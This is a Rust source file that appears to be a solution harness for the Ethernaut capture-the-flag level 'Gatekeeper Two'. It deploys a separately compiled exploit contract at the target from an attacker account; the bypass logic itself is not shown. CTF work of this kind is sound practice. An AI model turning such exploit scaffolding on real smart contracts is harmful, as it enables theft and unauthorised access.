//! Ethernaut 14 — Gatekeeper Two.
//!
//! Goal: Pass all three gates of `GatekeeperTwo` and register your offender
//! account as its `entrant`.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/GatekeeperTwo.sol

use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl14_gatekeeper_two::*;

pub struct Exploit;

alloy::sol!(
    #[sol(rpc)]
    GatekeeperTwoExploit,
    "out/GatekeeperTwoExploit.sol/GatekeeperTwoExploit.json"
);

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        GatekeeperTwoExploit::deploy_builder(
            offender.provider(),
            target.address,
        )
        .from(offender.address())
        .deploy()
        .await?;

        Ok(())
    }
}
